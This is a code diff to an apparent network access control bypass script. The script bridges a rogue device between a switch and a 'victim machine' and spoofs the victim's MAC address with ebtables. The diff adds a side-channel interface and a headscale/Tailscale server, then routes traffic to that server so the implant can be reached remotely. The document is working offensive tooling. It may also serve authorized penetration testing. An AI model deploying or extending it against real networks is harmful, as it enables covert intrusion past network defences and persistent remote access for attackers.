@@ -31,6 +31,11 @@ COMPINT=eth1 # network interface plugged into victim machine
 BRIP=169.254.66.66 # IP address for the bridge
 BRGW=169.254.66.1 # Gateway IP address for the bridge
 
+SIDE="" # sidechannel interface (optional, e.g., usb0)
+URL="" # URL of headscale server (optional)
+TS=tailscale0 # Tailscale interface (optional)
+TS_SUBNET=100.64.0.0/10 # Tailscale subnet (optional)
+
 TEMP_FILE=/tmp/tcpdump.pcap
 OPTION_RESPONDER=0
 OPTION_AUTONOMOUS=0
@@ -69,6 +74,8 @@ Usage() {
   echo -e "$0 v$VERSION usage:"
   echo "    -1 <eth>    network interface plugged into switch"
   echo "    -2 <eth>    network interface plugged into victim machine"
+  echo "    -3 <eth>    network interface for sidechannel communication (optional, e.g., usb0)"
+  echo "    -u <url>    URL of headscale server (optional, e.g., https://headscale.example.com)"
   echo "    -a          autonomous mode"
   echo "    -c          start connection setup only"
   echo "    -g <MAC>    set gateway MAC address (GWMAC) manually"
@@ -87,7 +94,7 @@ Version() {
 
 ## Check if we got all needed parameters
 CheckParams() {
-  while getopts ":1:2:acg:hirRS" opts
+  while getopts ":1:2:3:u:acg:hirR" opts
     do
       case "$opts" in
         "1")
@@ -95,6 +102,12 @@ CheckParams() {
           ;;
         "2")
           COMPINT=$OPTARG
+          ;;
+        "3")
+          SIDE=$OPTARG
+          ;;
+        "u")
+          URL=$OPTARG
           ;;
         "a")
           OPTION_AUTONOMOUS=1
@@ -261,18 +274,27 @@ ConnectionSetup() {
     $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
     $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC
 
+    if [ -n "$URL" ]; then
+        URL_IP=`getent hosts $URL | awk '{ print $1 }'`
+        if [ -z "$URL_IP" ]; then
+            error_exit "Failed to resolve URL: $URL"
+        fi
+        echo "$URL_IP    $URL" >> /etc/hosts
+    fi
+
+    if [ -n "$URL_IP" ] && [ -n "$SIDE" ]; then
+      SIDE_DEFAULT_GW=$(ip route | awk '/default/ && $5 == "'"$SIDE"'" {print $3; exit}')
+      if [ -n "$SIDE_DEFAULT_GW" ]; then
+        route add $URL_IP via $SIDE_DEFAULT_GW dev $SIDE
+        route add $TS_SUBNET dev $TS
+      else
+        echo "Warning: Could not determine default gateway for interface $SIDE. Route not added."
+      fi
+    fi
+
     ## Create default routes so we can route traffic - all traffic goes to the bridge gateway and this traffic gets Layer 2 sent to GWMAC
     arp -s -i $BRINT $BRGW $GWMAC
-    #route add default gw $BRGW dev $BRINT metric 10
-
-    # Route private class ips through bridge interface
-    ip route add 10.0.0.0/8 via $BRGW dev $BRINT
-    ip route add 172.16.0.0/12 via $BRGW dev $BRINT
-    ip route add 192.168.0.0/16 via $BRGW dev $BRINT
-    ip route add 169.254.0.0/16 via $BRGW dev $BRINT
-
-    # Remove default route by nac_bypass.sh (if it exists)
-    ip route del default via $BRGW dev $BRINT
+    route add default gw $BRGW dev $BRINT metric 10
 
     if [ "$OPTION_RESPONDER" -eq 1 ]; then
 
